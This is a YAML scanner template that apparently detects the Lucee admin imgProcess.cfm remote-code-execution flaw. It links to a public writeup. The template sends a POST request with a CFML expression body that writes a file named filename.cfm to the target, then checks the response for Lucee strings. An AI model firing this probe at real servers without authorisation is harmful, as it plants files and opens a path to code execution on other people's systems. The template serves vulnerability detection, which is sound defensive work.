params:
- root: '{{.BaseURL}}'
reference:
- links:
  - https://github.com/httpvoid/writeups/blob/main/Apple-RCE.md
requests:
- body: 'imgSrcsss="#stText.Buttons.save#"

    '
  detections:
  - StringSearch('body', '-lucee-icon') && StringSearch('body', 'Lucee')
  headers:
  - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101
      Firefox/55
  - Content-Type: application/x-www-form-urlencoded
  method: POST
  redirect: false
  url: '{{.root}}/lucee/admin/imgProcess.cfm?file=filename.cfm'
